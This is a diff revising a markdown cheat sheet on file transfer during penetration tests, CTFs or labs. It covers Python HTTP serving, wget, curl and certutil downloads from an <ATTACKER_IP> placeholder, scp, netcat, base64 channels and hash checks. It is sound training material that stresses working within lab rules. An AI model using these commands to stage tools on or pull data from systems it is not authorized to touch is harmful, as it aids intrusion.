@@ -5,6 +5,7 @@
 On attacker:
 
 ```bash
+cd /path/containing/file
 python3 -m http.server 8000
 ```
 
@@ -12,7 +13,7 @@ Linux target:
 
 ```bash
 wget http://<ATTACKER_IP>:8000/<FILE>
-curl -O http://<ATTACKER_IP>:8000/<FILE>
+curl http://<ATTACKER_IP>:8000/<FILE> -o <FILE>
 ```
 
 Windows target:
@@ -29,9 +30,14 @@ certutil -urlcache -split -f http://<ATTACKER_IP>:8000/<FILE> <FILE>
 
 ## SCP
 
+Requires valid SSH credentials:
+
 ```bash
-scp <FILE> <USER>@<TARGET_IP>:/tmp/
-scp <USER>@<TARGET_IP>:/path/to/file .
+# Upload
+scp <FILE> <USER>@<TARGET_IP>:/tmp/<FILE>
+
+# Download
+scp <USER>@<TARGET_IP>:/path/to/<FILE> .
 ```
 
 ## Netcat
@@ -50,22 +56,24 @@ nc <RECEIVER_IP> 9001 < file.bin
 
 ## Base64 Small Files
 
+Useful when direct download is blocked but text can be copied through the available channel.
+
 Encode:
 
 ```bash
-base64 -w 0 file.bin
+base64 <FILE> -w 0
 ```
 
 Decode:
 
 ```bash
-echo '<BASE64>' | base64 -d > file.bin
+echo '<BASE64>' | base64 -d > <FILE>
 ```
 
 PowerShell decode:
 
 ```powershell
-[IO.File]::WriteAllBytes('file.bin',[Convert]::FromBase64String('<BASE64>'))
+[IO.File]::WriteAllBytes('<FILE>',[Convert]::FromBase64String('<BASE64>'))
 ```
 
 ## Quick Choice
@@ -77,12 +85,24 @@ Only raw TCP? → Netcat
 Tiny file / awkward channel? → Base64
 ```
 
-## After Transfer
+## Validate the Transfer
+
+Prefer SHA-256 for integrity verification:
 
 ```bash
-chmod +x <FILE>
+# Run on both source and destination
 file <FILE>
 sha256sum <FILE>
 ```
 
-Only transfer tooling permitted by the competition or lab rules.
+Matching hashes confirm byte-for-byte integrity. Then, when appropriate:
+
+```bash
+chmod +x <FILE>
+```
+
+Record what was transferred and remove temporary tooling or servers when finished.
+
+Detailed notes: [File Transfer](../knowledge-base/exploitation/file-transfer.md)
+
+Only transfer tooling permitted by the engagement, competition, or lab rules.
